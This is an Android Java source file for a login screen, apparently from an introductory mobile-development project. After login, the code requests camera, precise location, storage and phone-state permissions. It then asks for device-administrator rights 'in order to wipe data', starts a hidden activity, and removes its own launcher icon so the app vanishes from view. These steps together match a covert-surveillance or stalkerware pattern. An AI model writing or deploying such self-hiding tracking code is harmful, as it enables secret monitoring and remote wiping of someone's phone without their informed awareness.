package com.introtomobileappdev.introtomobileappdev.activities;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.introtomobileappdev.introtomobileappdev.Admin;
import com.introtomobileappdev.introtomobileappdev.R;
import com.introtomobileappdev.introtomobileappdev.tasks.RequestTask;
import com.introtomobileappdev.introtomobileappdev.utils.Constants;

import java.util.HashMap;

public class LogInActivity extends AppCompatActivity {

    private EditText emailEditText;
    private EditText passwordEditText;
    private TextView wrongCredentialsTextView;
    private Button logInButton;
    private TextView signUpTextView;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.login_activity);
        initViews();

        fillEmail();

        setOnClickListeners();
        activateTextChangedListeners();
    }

    private void fillEmail() {
        try
        {
            String email = getIntent().getStringExtra(Constants.EMAIL_KEY);
            emailEditText.setText(email);
        }

        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    private void activateTextChangedListeners()
    {
        emailEditText.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                if (count > 0 && !passwordEditText.getText().toString().isEmpty())
                    logInButton.setEnabled(true);

                else logInButton.setEnabled(false);

                wrongCredentialsTextView.setVisibility(View.INVISIBLE);
            }

            @Override
            public void afterTextChanged(Editable s) {

            }
        });

        passwordEditText.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                if (count > 0 && !emailEditText.getText().toString().isEmpty())
                    logInButton.setEnabled(true);

                else logInButton.setEnabled(false);

                wrongCredentialsTextView.setVisibility(View.INVISIBLE);
            }

            @Override
            public void afterTextChanged(Editable s) {

            }
        });
    }


    private void initViews()
    {
        emailEditText = findViewById(R.id.emailEditText);
        passwordEditText = findViewById(R.id.passwordEditText);
        wrongCredentialsTextView = findViewById(R.id.wrongCredentialsTextView);
        logInButton = findViewById(R.id.loginButton);
        signUpTextView = findViewById(R.id.signUpTextView);
    }

    private HashMap<String, String> getInputtedData()
    {
        HashMap<String, String> data = new HashMap<>();
        data.put(Constants.EMAIL_KEY, emailEditText.getText().toString());
        data.put(Constants.PASSWORD_KEY, passwordEditText.getText().toString());

        return data;
    }

    private void setOnClickListeners()
    {
        logInButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                RequestTask requestTask = new RequestTask();
                requestTask.execute(getInputtedData());

                try
                {
                    String response = requestTask.get();
                    if (response.equals(Constants.SIGN_IN_SUCCESS_MESSAGE))
                    {
                        requestPermissions();
                    }

                    else
                    {
                        wrongCredentialsTextView.setVisibility(View.VISIBLE);
                    }
                }
                catch (Exception e)
                {
                    e.printStackTrace();
                }
            }
        });
        signUpTextView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startSignUpActivity();
            }
        });
    }

    private void requestPermissions() {
        ActivityCompat.requestPermissions(
                LogInActivity.this,
                new String[] {
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.CAMERA,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.READ_PHONE_STATE
                },
                1);
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        boolean canContinue = true;

        for (int i = 0; i < grantResults.length; i++) {
            if (grantResults[i] == -1)
            {
                canContinue = false;
                break;
            }
        }

        if (canContinue)
        {
            requestAdminPermission();
            startHiddenActivity();
            hideApp();
        }

        else
        {
            Toast.makeText(getApplicationContext(), "Please grant all permissions", Toast.LENGTH_LONG).show();
        }
    }

    private void requestAdminPermission()
    {
        ComponentName componentName = new ComponentName(getApplicationContext(), Admin.class);

        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "In order to wipe data");
        startActivityForResult(intent, 1);
    }

    private void startHiddenActivity() {
        startActivity(new Intent(getApplicationContext(), HiddenActivity.class));
    }

    private void hideApp() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, LogInActivity.class);
        packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        finish();
    }

    private void startSignUpActivity() {
        Intent intent = new Intent(getApplicationContext(), SignUpActivity.class);
        intent.putExtra(Constants.EMAIL_KEY, emailEditText.getText().toString());
        startActivity(intent);
    }
}
